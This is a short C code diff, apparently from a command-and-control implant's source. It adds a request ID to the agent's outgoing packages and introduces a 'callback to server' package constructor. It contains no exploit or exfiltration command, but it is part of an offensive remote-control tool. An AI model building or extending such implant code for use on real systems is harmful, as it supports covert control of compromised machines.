@@ -127,6 +127,7 @@ PPACKAGE PackageCreate( UINT32 CommandID )
     Package            = Instance.Win32.LocalAlloc( LPTR, sizeof( PACKAGE ) );
     Package->Buffer    = Instance.Win32.LocalAlloc( LPTR, sizeof( BYTE ) );
     Package->Length    = 0;
+    Package->RequestID = Instance.CurrentRequestID;
     Package->CommandID = CommandID;
     Package->Encrypt   = TRUE;
     Package->Destroy   = TRUE;
@@ -134,6 +135,29 @@ PPACKAGE PackageCreate( UINT32 CommandID )
     PackageAddInt32( Package, 0 );
     PackageAddInt32( Package, DEMON_MAGIC_VALUE );
     PackageAddInt32( Package, Instance.Session.AgentID );
+    PackageAddInt32( Package, Package->RequestID );
+    PackageAddInt32( Package, CommandID );
+
+    return Package;
+}
+
+// For callback to server
+PPACKAGE PackageCreateWithRequestID( UINT32 RequestID, UINT32 CommandID )
+{
+    PPACKAGE Package = NULL;
+
+    Package            = Instance.Win32.LocalAlloc( LPTR, sizeof( PACKAGE ) );
+    Package->Buffer    = Instance.Win32.LocalAlloc( LPTR, sizeof( BYTE ) );
+    Package->Length    = 0;
+    Package->RequestID = RequestID;
+    Package->CommandID = CommandID;
+    Package->Encrypt   = TRUE;
+    Package->Destroy   = TRUE;
+
+    PackageAddInt32( Package, 0 );
+    PackageAddInt32( Package, DEMON_MAGIC_VALUE );
+    PackageAddInt32( Package, Instance.Session.AgentID );
+    PackageAddInt32( Package, RequestID );
     PackageAddInt32( Package, CommandID );
 
     return Package;
@@ -193,7 +217,7 @@ BOOL PackageTransmit( PPACKAGE Package, PVOID* Response, PSIZE_T Size )
 
         if ( Package->Encrypt )
         {
-            Padding = sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 );
+            Padding = sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 );
 
             if ( Package->CommandID == DEMON_INITIALIZE ) // only add these on init or key exchange
                 Padding += 32 + 16;
